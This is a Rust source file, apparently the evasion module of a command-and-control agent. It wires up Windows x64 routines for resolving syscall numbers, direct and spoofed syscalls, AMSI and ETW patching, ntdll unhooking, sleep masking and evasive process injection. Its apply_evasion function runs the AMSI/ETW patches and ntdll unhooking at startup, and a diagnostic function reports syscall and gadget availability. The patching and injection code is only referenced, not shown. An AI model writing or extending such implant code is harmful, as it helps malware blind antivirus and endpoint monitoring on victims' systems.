// Evasion layer for the Rust agent — mirrors the Go agent's
// agent/internal/win package: SSN resolution, direct/indirect/spoofed
// syscalls, AMSI/ETW patching, ntdll unhooking, sleep masking and evasive
// injection (section + phantom/UDRL). Windows x64 only; other platforms build
// these as no-ops so the agent still compiles everywhere.

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub mod pe;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub mod ssn;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub mod syscall;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub mod patch;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub mod unhook;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub mod mask;
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub mod inject;

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
mod stub {
    pub fn _unsupported() {}
}

// Stub modules so the plugin code compiles on non-Windows (returns "unsupported"
// at runtime).
#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub mod patch {
    pub fn patch_amsi() -> Result<(), String> { Err("Windows-only".into()) }
    pub fn patch_etw_ex() -> Result<(), String> { Err("Windows-only".into()) }
}
#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub mod unhook {
    pub fn unhook_ntdll() -> Result<(), String> { Err("Windows-only".into()) }
}
#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub mod mask {
    pub fn mask_sleep(_ms: i32) -> Result<(), String> { Err("Windows-only".into()) }
}

/// One-shot evasion bootstrap: warm SSNs, patch AMSI/ETW, unhook ntdll.
/// Every step is panic-protected so a failure never kills the agent.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub fn apply_evasion() {
    ssn::ensure_ssns();
    for f in [patch::patch_amsi, patch::patch_etw_ex, unhook::unhook_ntdll] {
        let _ = std::panic::catch_unwind(f);
    }
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub fn apply_evasion() {}

/// Report an evasion diagnostic summary (SSN resolution + gadget availability).
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub fn diag() -> String {
    ssn::ensure_ssns();
    let mut out = String::new();
    let ntdll = pe::module_ntdll();
    out.push_str(&format!("ntdll base=0x{ntdll:x}\n"));
    for name in ["NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtDelayExecution"] {
        if let Some(e) = ssn::ssn_by_name(name) {
            out.push_str(&format!("{name} SSN=0x{:x} gadget={}\n", e.ssn, e.gadget != 0));
        } else {
            out.push_str(&format!("{name} MISSING\n"));
        }
    }
    out
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub fn diag() -> String {
    "evasion: unsupported on this platform".into()
}
